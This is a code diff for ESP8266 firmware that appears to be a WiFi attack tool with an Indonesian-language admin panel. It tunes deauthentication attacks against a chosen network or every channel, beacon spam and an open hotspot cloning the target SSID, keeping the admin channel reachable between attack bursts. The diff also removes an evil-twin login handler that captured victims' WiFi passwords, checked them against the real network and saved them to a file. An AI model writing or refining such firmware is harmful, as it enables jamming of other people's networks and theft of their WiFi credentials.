@@ -18,6 +18,7 @@ bool attack_all = false;
 String selected_bssid = ""; 
 String selected_ssid = "";
 uint8_t target_ch = 1;
+uint8_t admin_ch = 1; // Pengunci channel admin
 
 ESP8266WebServer server(80);
 DNSServer dnsServer;
@@ -55,7 +56,7 @@ void spamBeacon() {
   }
 }
 
-// ================= UI ADMIN =================
+// ================= UI ADMIN (SESUAI SS LU) =================
 const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GMpro87 - Admin Panel</title>
 <style>
@@ -151,8 +152,10 @@ String processor(const String& var) {
 
 void setup() {
   Serial.begin(115200); LittleFS.begin();
-  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
+  WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
+  admin_ch = WiFi.channel(); // Lock channel admin pas awal
+  
   dnsServer.start(53, "*", WiFi.softAPIP());
 
   server.on("/", []() {
@@ -163,17 +166,8 @@ void setup() {
     server.send(200, "text/html", html);
   });
 
-  server.on("/login", HTTP_POST, []() {
-    String p = server.arg("password"); deauth_running = false; rusuh_mode = false;
-    WiFi.begin(selected_ssid.c_str(), p.c_str());
-    int c = 0; while (WiFi.status() != WL_CONNECTED && c < 20) { delay(500); c++; yield(); }
-    if (WiFi.status() == WL_CONNECTED) {
-      File f = LittleFS.open("/pass.txt", "a"); f.println("[PASS] " + selected_ssid + " : " + p); f.close();
-      WiFi.disconnect(); server.send(200, "text/html", "Success");
-    } else { WiFi.disconnect(); deauth_running = true; server.send(403, "text/html", "Wrong"); }
-  });
+  server.on("/scan", []() { wifi_promiscuous_enable(0); WiFi.scanNetworks(true, true); server.sendHeader("Location", "/"); server.send(302); });
 
-  server.on("/scan", []() { WiFi.scanNetworks(true, true); server.sendHeader("Location", "/"); server.send(302); });
   server.on("/attack", []() {
     String t = server.arg("type");
     if (t == "deauth") deauth_running = !deauth_running;
@@ -181,6 +175,10 @@ void setup() {
     if (t == "beacon") beacon_running = !beacon_running;
     if (t == "deauthall") attack_all = !attack_all;
     if (t == "hotspot") WiFi.softAP(selected_ssid.c_str(), ""); 
+    
+    if(deauth_running || rusuh_mode || attack_all) wifi_promiscuous_enable(1);
+    else wifi_promiscuous_enable(0);
+    
     server.sendHeader("Location", "/"); server.send(302);
   });
 
@@ -188,6 +186,7 @@ void setup() {
   server.on("/save", HTTP_POST, []() {
     admin_ssid = server.arg("adm_ssid"); admin_pass = server.arg("adm_pass");
     beacon_count = server.arg("b_count").toInt(); WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
+    admin_ch = WiFi.channel();
     server.sendHeader("Location", "/"); server.send(302);
   });
 
@@ -200,16 +199,27 @@ void setup() {
 void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
-  yield();
   
   if (deauth_running && selected_bssid != "") {
-    wifi_set_channel(target_ch); sendDeauth(selected_bssid); delay(1); 
+    wifi_set_channel(target_ch);
+    sendDeauth(selected_bssid);
+    yield();
+    wifi_set_channel(admin_ch); // BALIK KE CHANNEL ADMIN SEGERA
   }
+  
   if (rusuh_mode || attack_all) {
-    static uint8_t ch = 1; wifi_set_channel(ch);
-    sendDeauth("FF:FF:FF:FF:FF:FF"); 
-    ch++; if (ch > 13) ch = 1;
-    delay(2); 
+    static unsigned long last_hop = 0;
+    if (millis() - last_hop > 150) { // Jeda biar WebServer gak mati
+      static uint8_t ch = 1;
+      wifi_set_channel(ch);
+      sendDeauth("FF:FF:FF:FF:FF:FF");
+      ch++; if (ch > 13) ch = 1;
+      last_hop = millis();
+      yield();
+      wifi_set_channel(admin_ch); // BALIK KE CHANNEL ADMIN SEGERA
+    }
   }
-  if (beacon_running) { spamBeacon(); delay(5); }
+  
+  if (beacon_running) { spamBeacon(); yield(); }
+  yield();
 }
